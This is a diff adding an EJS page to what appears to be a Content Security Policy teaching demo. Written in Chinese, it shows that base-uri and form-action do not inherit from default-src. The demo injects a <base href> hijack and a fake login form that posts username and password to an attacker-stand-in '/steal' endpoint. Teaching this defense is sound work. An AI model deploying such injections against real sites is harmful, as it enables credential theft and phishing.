@@ -1,0 +1,26 @@
+<%- include('partials/header') %>
+<% if (compare) { %>
+  <p>
+    <code>base-uri</code>、<code>form-action</code>、<code>frame-ancestors</code> 管的不是資源載入，不會使用 <code>default-src</code> 的值，要另外設定。
+    每欄都被注入一個 <code>&lt;base href="<%= OTHER %>/"&gt;</code> 和一個送到攻擊者網站的假登入表單。
+  </p>
+
+  <%- include('partials/compare') %>
+
+  <ul>
+    <li><strong>沒有 CSP、只有 <code>default-src 'self'</code></strong>：「會員中心」被改到 <code><%= OTHER %>/account</code>；按「登入」，框框會跳到攻擊者的網站，顯示收到的帳密。</li>
+    <li><strong>加上 <code>base-uri</code>、<code>form-action</code></strong>：<code>&lt;base&gt;</code> 被忽略，連結留在本站；按「登入」被擋，畫面不動，結果多一行 <code>form-action</code>。</li>
+  </ul>
+  <p>表單送出後按欄位下方的「重新載入」回到原本的畫面。</p>
+<% } else { %>
+  <%- include('partials/snippet', { kind: 'injected', html: `
+<base href="${OTHER}/">
+<p><a id="account" href="/account">會員中心</a> → <code id="account-href"></code></p>
+<form action="${OTHER}/steal?from=${mode}" method="post">
+  <label>帳號 <input name="username" value="antonio" size="8"></label>
+  <label>密碼 <input name="password" type="password" value="p@ssw0rd" size="8"></label>
+  <button>登入</button>
+</form>
+` }) %>
+<% } %>
+<%- include('partials/footer', { scripts: ['/js/base-form.js'] }) %>
